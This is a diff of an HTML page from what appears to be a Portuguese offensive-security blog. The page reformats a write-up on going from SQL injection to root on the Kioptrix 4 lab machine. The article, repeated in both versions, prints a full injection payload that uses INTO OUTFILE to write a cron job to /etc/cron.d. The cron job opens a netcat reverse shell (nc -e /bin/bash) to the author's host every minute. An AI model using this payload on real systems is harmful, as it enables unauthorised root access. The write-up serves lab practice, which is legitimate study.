@@ -3,29 +3,34 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- iOS Safari -->
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
-  <meta name="theme-color" content="#FFFFFF">
-  <meta property="og:title" content="Do SQLi ao Root em 2 Passos">
-    <meta name="description" content="Como em dois passos pode-se chegar ao root se o mysql estiver configurado para rodar com usuário superprivilegiado.">
-  <meta property="og:description" content="Como em dois passos pode-se chegar ao root se o mysql estiver configurado para rodar com usuário superprivilegiado.">
-    <meta property="og:type" content="blog">
-  <title>Do SQLi ao Root em 2 Passos</title>
-  <!-- Favicon -->
-    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
-  <link rel="stylesheet" type="text/css"
-    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
-  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
-  <link rel="stylesheet" type="text/css" href="css/notablog.css">
-  <link rel="stylesheet" type="text/css" href="css/theme.css">
-  <style>
-    :root {
-      font-size: 18px;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
 
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Do SQLi ao Root em 2 Passos&nbsp;|&nbsp;www.offensivethink.com</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Do SQLi ao Root em 2 Passos">
+  
+    <meta name="description" content="Como em dois passos pode-se chegar ao root se o mysql estiver configurado para rodar com usuário superprivilegiado.">
+    <meta property="og:description" content="Como em dois passos pode-se chegar ao root se o mysql estiver configurado para rodar com usuário superprivilegiado.">
+  
+  
+  <style>
     .DateTagBar {
       margin-top: 1.0rem;
     }
@@ -34,45 +39,115 @@
 
 <body>
   <nav class="Navbar">
-    <a href="index.html">
-      <div class="Navbar__Btn"> <span>Home</span></div>
-    </a>
-                                                    <span class="Navbar__Delim">&centerdot;</span>
-    <a href="referencia-rapida.html">
-      <div class="Navbar__Btn"> <span>→ Referência rápida ← </span></div>
-    </a>
-                                                                                                                                        <span class="Navbar__Delim">&centerdot;</span>
-    <a href="contacts.html">
-      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&id=ca933149-5245-4511-a885-9cf5922808e1"></span> <span>about & contacts</span></div>
-    </a>
-                <span class="Navbar__Delim">&centerdot;</span>
-    <a href="offensivetools.html">
-      <div class="Navbar__Btn"> <span>Offensive Tools</span></div>
-    </a>
-                                                                                          </nav>
+  <a href="index.html">
+    <div class="Navbar__Btn">
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="referencia-rapida.html">
+        <div class="Navbar__Btn">
+          
+          <span>→ Referência rápida ← </span>
+        </div>
+      </a>
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="contacts.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
+          
+          <span>about &amp; contacts</span>
+        </div>
+      </a>
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="offensivetools.html">
+        <div class="Navbar__Btn">
+          
+          <span>Offensive Tools</span>
+        </div>
+      </a>
+    
+  
+</nav>
   <header class="Header">
-          <div class="Header__Cover">
+    
+      <div class="Header__Cover">
         <img src="https://www.notion.so/images/page-cover/nasa_transonic_tunnel.jpg">
       </div>
-          <div class="Header__Spacer ">
+    
+    <div class="Header__Spacer ">
     </div>
-        <h1 class="Header__Title">Do SQLi ao Root em 2 Passos</h1>
-            <div class="DateTagBar">
-                <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Jul 30, 2020</span>
-                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--default">
+    
+    <h1 class="Header__Title_post">Do SQLi ao Root em 2 Passos</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Jul 30, 2020</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--default">
             <a href="tag/sqli.html">sqli</a>
           </span>
-                  </div>
-          </header>
-      <article id="https://www.notion.so/18d82588d75c4b97a97a380e625fe890" class="PageRoot"><div id="https://www.notion.so/9bb593e81ab14e17bf42a6c3aa95cd65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f57dcc78582f4c37a34ea92b8a589540" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Tudo começou quando eu vi um Bode e quando esse danado desse bode me levou para uma jaula onde eu quase perco o restante dos cabelos que eu tinha para sair dela. :D :D</span></span></p></div><div id="https://www.notion.so/68d13dd4fb6f4657a1eb9a8e009fd1b1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4554974c9aa541b6950bd3eeacb155b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mas ai eu descobri uma coisa interessante nessa máquina, é que os arquivos que eu conseguia escrever nela através de SQLi ficavam com usuário e grupo root. Esta máquina é a Kioptrix 4.</span></span></p></div><div id="https://www.notion.so/b735938a80974f5ea09c0561cefefff6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/306051ae351b49da8b4de8a6bda39f7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Então pensei. O processo do MySQL deve rodar como root e se ele roda como root ele é todo poderoso. Se ele é todo poderoso ele pode escrever onde eu quiser e como quiser. Então , que tal, escrever em um arquivo de crontab um comando para fazer shell reverso pra mim ? Bora tentar assim :</span></span></p></div><div id="https://www.notion.so/3943fa48fbb94235b6e6da64a5e326a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0a6d5e36cdcf491db9f839aa666e9642" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos tentar criar um arquivo em /etc/cron.d que programe o cron para tentar conectar na nossa máquina a cada 1 minuto:</span></span></p></div><pre id="https://www.notion.so/f7396be146f247cbb0edf094b75b483a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>*/1  * * * *  root  nc.traditional 192.168.200.3 443 -e /bin/bash</span></span></span></code></pre><div id="https://www.notion.so/95c81cf0d9f14fafb3975a0293772b3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Então, nosso SQLi, ficaria assim:</span></span></p></div><pre id="https://www.notion.so/4b457181921f4d2d8ff9c45fde9418bf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>myusername<span class="token operator">=</span>john<span class="token operator">&amp;</span>mypassword<span class="token operator">=</span><span class="token operator">-</span><span class="token number">9334</span>'<span class="token operator">OR</span> <span class="token number">1908</span><span class="token operator">=</span><span class="token number">1908</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">all</span> 
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/18d82588d75c4b97a97a380e625fe890" class="PageRoot"><div id="https://www.notion.so/9bb593e81ab14e17bf42a6c3aa95cd65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f57dcc78582f4c37a34ea92b8a589540" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Tudo começou quando eu vi um Bode e quando esse danado desse bode me levou para uma jaula onde eu quase perco o restante dos cabelos que eu tinha para sair dela. :D :D</span></span></p></div><div id="https://www.notion.so/68d13dd4fb6f4657a1eb9a8e009fd1b1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4554974c9aa541b6950bd3eeacb155b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mas ai eu descobri uma coisa interessante nessa máquina, é que os arquivos que eu conseguia escrever nela através de SQLi ficavam com usuário e grupo root. Esta máquina é a Kioptrix 4.</span></span></p></div><div id="https://www.notion.so/b735938a80974f5ea09c0561cefefff6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/306051ae351b49da8b4de8a6bda39f7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Então pensei. O processo do MySQL deve rodar como root e se ele roda como root ele é todo poderoso. Se ele é todo poderoso ele pode escrever onde eu quiser e como quiser. Então , que tal, escrever em um arquivo de crontab um comando para fazer shell reverso pra mim ? Bora tentar assim :</span></span></p></div><div id="https://www.notion.so/3943fa48fbb94235b6e6da64a5e326a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0a6d5e36cdcf491db9f839aa666e9642" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos tentar criar um arquivo em /etc/cron.d que programe o cron para tentar conectar na nossa máquina a cada 1 minuto:</span></span></p></div><pre id="https://www.notion.so/f7396be146f247cbb0edf094b75b483a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>*/1  * * * *  root  nc.traditional 192.168.200.3 443 -e /bin/bash</span></span></span></code></pre><div id="https://www.notion.so/95c81cf0d9f14fafb3975a0293772b3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Então, nosso SQLi, ficaria assim:</span></span></p></div><pre id="https://www.notion.so/4b457181921f4d2d8ff9c45fde9418bf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>myusername<span class="token operator">=</span>john<span class="token operator">&amp;</span>mypassword<span class="token operator">=</span><span class="token operator">-</span><span class="token number">9334</span>'<span class="token operator">OR</span> <span class="token number">1908</span><span class="token operator">=</span><span class="token number">1908</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">all</span> 
 <span class="token keyword">select</span> <span class="token string">"*/1 *   * * *"</span> <span class="token punctuation">,</span> <span class="token string">"root"</span> <span class="token punctuation">,</span> <span class="token string">"nc.traditional 192.168.200.3 443 -e /bin/bash"</span> 
-</span></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span></span></mark></strong></span><span class="SemanticString"><span> <span class="token string">'/etc/cron.d/crontab'</span><span class="token comment">--%20-</span></span></span></span></code></pre><div id="https://www.notion.so/45337523dbbb458a988dc38f831c5afd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/66248293e08f4bd5bccb5ae3c19dacc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Tá, não foi assim de primeira , no alvo, prego batido de ponta virada né ? Primeiro apanhei para descobrir que essa danada dessa máquina só tem permissão para se conecta na porta 443 e 22. Depois apanhei tentando fazer com um telnet reverso mas o cron, pelo que entendi abre um subprocesso que morre logo em seguida não permitindo que o telnet fique no ar. Não cheguei a tentar com perl, php, python, etc., pois eu tava decidido a fazer com &quot;comandos do sistema&quot;. Ai no finalzim, vi que o danado tinha o nc.tradicional, ou seja, o nosso net gatinho tradicional.</em></span></span></p></div><div id="https://www.notion.so/983a70d680c94dfd9d3026c284b46cc0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/355bb56660744cd0977329126db659ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ai agora é injetar via Burp abrir um NC no terminal e aguardar o Shell cair no seu colo:</span></span></p></div><div id="https://www.notion.so/e9f8fde3038a4e5ca72fbc1cc988afdf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mandando bala</span></span></p></div><div id="https://www.notion.so/dcd102848cd74d328c15a59b8e98a9eb" class="Image Image--PageWidth"><figure><a href="#?width=668"><img src="#?width=668" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0627806a56374c9c8773c24df0a15802" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b96d29b7185e407690072c2c0c4cec9b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a9dd35c677e74d54a10d9fd798ea59cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recebendo o doce</span></span></p></div><div id="https://www.notion.so/dee3a871f5f347159cf2f78913781ff0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a7cc8dbc7d2845e98bb70f105aab89f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E tá ai , rapidinho, nada de restricted shell, nada de escalar privilégios, etc, etc, etc. Direto ao Shell. ;D</span></span></p></div></article>  <footer class="Footer">
-        <div>&copy; Offensive Articles 2019</div>
-        <div>&centerdot;</div>
-        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
-            rel="noopener noreferrer">Notablog</a>.
-        </div>
-    </footer>
+</span></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span></span></mark></strong></span><span class="SemanticString"><span> <span class="token string">'/etc/cron.d/crontab'</span><span class="token comment">--%20-</span></span></span></span></code></pre><div id="https://www.notion.so/45337523dbbb458a988dc38f831c5afd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/66248293e08f4bd5bccb5ae3c19dacc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Tá, não foi assim de primeira , no alvo, prego batido de ponta virada né ? Primeiro apanhei para descobrir que essa danada dessa máquina só tem permissão para se conecta na porta 443 e 22. Depois apanhei tentando fazer com um telnet reverso mas o cron, pelo que entendi abre um subprocesso que morre logo em seguida não permitindo que o telnet fique no ar. Não cheguei a tentar com perl, php, python, etc., pois eu tava decidido a fazer com &quot;comandos do sistema&quot;. Ai no finalzim, vi que o danado tinha o nc.tradicional, ou seja, o nosso net gatinho tradicional.</em></span></span></p></div><div id="https://www.notion.so/983a70d680c94dfd9d3026c284b46cc0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/355bb56660744cd0977329126db659ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ai agora é injetar via Burp abrir um NC no terminal e aguardar o Shell cair no seu colo:</span></span></p></div><div id="https://www.notion.so/e9f8fde3038a4e5ca72fbc1cc988afdf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mandando bala</span></span></p></div><div id="https://www.notion.so/dcd102848cd74d328c15a59b8e98a9eb" class="Image Image--PageWidth"><figure><a href="#?width=668"><img src="#?width=668" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0627806a56374c9c8773c24df0a15802" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b96d29b7185e407690072c2c0c4cec9b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a9dd35c677e74d54a10d9fd798ea59cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recebendo o doce</span></span></p></div><div id="https://www.notion.so/dee3a871f5f347159cf2f78913781ff0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a7cc8dbc7d2845e98bb70f105aab89f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E tá ai , rapidinho, nada de restricted shell, nada de escalar privilégios, etc, etc, etc. Direto ao Shell. ;D</span></span></p></div></article>
+  <footer class="Footer">
+  <div>&copy; www.offensivethink.com 2019-2021</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
 </body>
 
 </html>
